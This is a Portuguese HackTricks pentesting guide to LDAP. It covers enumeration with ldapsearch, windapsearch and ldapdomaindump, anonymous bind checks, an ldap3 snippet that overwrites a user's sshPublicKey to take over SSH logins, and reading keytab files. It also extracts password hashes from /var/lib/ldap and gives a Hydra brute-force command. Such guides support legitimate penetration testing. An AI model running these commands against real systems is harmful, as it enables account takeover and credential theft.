# 389, 636, 3268, 3269 - Pentesting LDAP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

O uso do **LDAP** (Protocolo Leve de Acesso a Diret√≥rios) √© principalmente para localizar v√°rias entidades, como organiza√ß√µes, indiv√≠duos e recursos como arquivos e dispositivos dentro de redes, tanto p√∫blicas quanto privadas. Ele oferece uma abordagem simplificada em compara√ß√£o com seu predecessor, DAP, tendo uma menor pegada de c√≥digo.

Os diret√≥rios LDAP s√£o estruturados para permitir sua distribui√ß√£o em v√°rios servidores, com cada servidor abrigando uma vers√£o **replicada** e **sincronizada** do diret√≥rio, referida como um Agente de Sistema de Diret√≥rio (DSA). A responsabilidade por lidar com as solicita√ß√µes recai inteiramente sobre o servidor LDAP, que pode se comunicar com outros DSAs conforme necess√°rio para fornecer uma resposta unificada ao solicitante.

A organiza√ß√£o do diret√≥rio LDAP se assemelha a uma **hierarquia em √°rvore, come√ßando com o diret√≥rio raiz no topo**. Isso se ramifica para pa√≠ses, que se dividem ainda mais em organiza√ß√µes, e depois em unidades organizacionais representando v√°rias divis√µes ou departamentos, finalmente alcan√ßando o n√≠vel das entidades individuais, incluindo tanto pessoas quanto recursos compartilhados como arquivos e impressoras.

**Porta padr√£o:** 389 e 636(ldaps). O Cat√°logo Global (LDAP no ActiveDirectory) est√° dispon√≠vel por padr√£o nas portas 3268 e 3269 para LDAPS.
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### LDAP Data Interchange Format

LDIF (LDAP Data Interchange Format) define o conte√∫do do diret√≥rio como um conjunto de registros. Ele tamb√©m pode representar solicita√ß√µes de atualiza√ß√£o (Adicionar, Modificar, Excluir, Renomear).
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* As linhas 1-3 definem o dom√≠nio de n√≠vel superior local
* As linhas 5-8 definem o dom√≠nio de primeiro n√≠vel moneycorp (moneycorp.local)
* As linhas 10-16 definem 2 unidades organizacionais: dev e vendas
* As linhas 18-26 criam um objeto do dom√≠nio e atribuem atributos com valores

## Escrever dados

Note que se voc√™ puder modificar valores, poder√° realizar a√ß√µes realmente interessantes. Por exemplo, imagine que voc√™ **pode mudar a informa√ß√£o "sshPublicKey"** do seu usu√°rio ou de qualquer usu√°rio. √â altamente prov√°vel que, se esse atributo existir, ent√£o **ssh est√° lendo as chaves p√∫blicas do LDAP**. Se voc√™ puder modificar a chave p√∫blica de um usu√°rio, voc√™ **poder√° fazer login como esse usu√°rio, mesmo que a autentica√ß√£o por senha n√£o esteja habilitada no ssh**.
```bash
# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## Sniff clear text credentials

Se o LDAP for usado sem SSL, voc√™ pode **snifar credenciais em texto claro** na rede.

Al√©m disso, voc√™ pode realizar um ataque **MITM** na rede **entre o servidor LDAP e o cliente.** Aqui voc√™ pode fazer um **Downgrade Attack** para que o cliente use as **credenciais em texto claro** para fazer login.

**Se o SSL for usado**, voc√™ pode tentar fazer **MITM** como mencionado acima, mas oferecendo um **certificado falso**; se o **usu√°rio aceit√°-lo**, voc√™ poder√° rebaixar o m√©todo de autentica√ß√£o e ver as credenciais novamente.

## Anonymous Access

### Bypass TLS SNI check

De acordo com [**este writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/), apenas acessando o servidor LDAP com um nome de dom√≠nio arbitr√°rio (como company.com), ele conseguiu contatar o servi√ßo LDAP e extrair informa√ß√µes como um usu√°rio an√¥nimo:
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### LDAP anonymous binds

[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) permitem que **atacantes n√£o autenticados** recuperem informa√ß√µes do dom√≠nio, como uma lista completa de usu√°rios, grupos, computadores, atributos de conta de usu√°rio e a pol√≠tica de senha do dom√≠nio. Esta √© uma **configura√ß√£o legada**, e a partir do Windows Server 2003, apenas usu√°rios autenticados est√£o autorizados a iniciar solicita√ß√µes LDAP.\
No entanto, os administradores podem ter precisado **configurar um aplicativo espec√≠fico para permitir binds an√¥nimos** e concedido mais acesso do que o pretendido, permitindo assim que usu√°rios n√£o autenticados acessem todos os objetos no AD.

## Valid Credentials

Se voc√™ tiver credenciais v√°lidas para fazer login no servidor LDAP, pode extrair todas as informa√ß√µes sobre o Domain Admin usando:

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [For√ßa Bruta](../generic-methodologies-and-resources/brute-force.md#ldap)

## Enumera√ß√£o

### Automatizado

Usando isso, voc√™ poder√° ver as **informa√ß√µes p√∫blicas** (como o nome do dom√≠nio)**:**
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>Veja a enumera√ß√£o LDAP com python</summary>

Voc√™ pode tentar **enumerar um LDAP com ou sem credenciais usando python**: `pip3 install ldap3`

Primeiro, tente **conectar sem** credenciais:
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
Se a resposta for `True`, como no exemplo anterior, voc√™ pode obter alguns **dados interessantes** do servidor LDAP (como o **contexto de nomea√ß√£o** ou **nome de dom√≠nio**) de:
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
Uma vez que voc√™ tenha o contexto de nomea√ß√£o, pode fazer algumas consultas mais interessantes. Esta consulta simples deve mostrar todos os objetos no diret√≥rio:
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
Ou **dump** todo o ldap:
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch) √© um script em Python √∫til para **enumerar usu√°rios, grupos e computadores de um dom√≠nio Windows** utilizando consultas LDAP.
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

Verifique credenciais nulas ou se suas credenciais s√£o v√°lidas:
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
Se voc√™ encontrar algo dizendo que o "_bind deve ser conclu√≠do_" significa que as credenciais est√£o incorretas.

Voc√™ pode extrair **tudo de um dom√≠nio** usando:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
Extrair **usu√°rios**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
Extrair **computadores**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Extrair **minhas informa√ß√µes**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Extrair **Domain Admins**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Extrair **Usu√°rios do Dom√≠nio**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Extrair **Enterprise Admins**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Extrair **Administradores**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Extrair **Grupo de √Årea de Trabalho Remota**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Para ver se voc√™ tem acesso a alguma senha, voc√™ pode usar grep ap√≥s executar uma das consultas:
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
Por favor, note que as senhas que voc√™ pode encontrar aqui podem n√£o ser as reais...

#### pbis

Voc√™ pode baixar **pbis** daqui: [https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/) e geralmente √© instalado em `/opt/pbis`.\
**Pbis** permite que voc√™ obtenha informa√ß√µes b√°sicas facilmente:
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## Graphical Interface

### Apache Directory

[**Baixe o Apache Directory daqui**](https://directory.apache.org/studio/download/download-linux.html). Voc√™ pode encontrar um [exemplo de como usar esta ferramenta aqui](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s).

### jxplorer

Voc√™ pode baixar uma interface gr√°fica com servidor LDAP aqui: [http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

Por padr√£o, ele √© instalado em: _/opt/jxplorer_

![](<../.gitbook/assets/image (482).png>)

### Godap

Voc√™ pode acess√°-lo em [https://github.com/Macmod/godap](https://github.com/Macmod/godap)

## Authentication via kerberos

Usando `ldapsearch` voc√™ pode **autenticar** contra **kerberos em vez** de via **NTLM** usando o par√¢metro `-Y GSSAPI`

## POST

Se voc√™ puder acessar os arquivos onde os bancos de dados est√£o contidos (pode estar em _/var/lib/ldap_). Voc√™ pode extrair os hashes usando:
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
Voc√™ pode alimentar john com o hash da senha (de '{SSHA}' para 'structural' sem adicionar 'structural').

### Arquivos de Configura√ß√£o

* Geral
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 server
* V3.sas.oc
* Microsoft Active Directory server
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP directory server
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif

## HackTricks Comandos Autom√°ticos
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
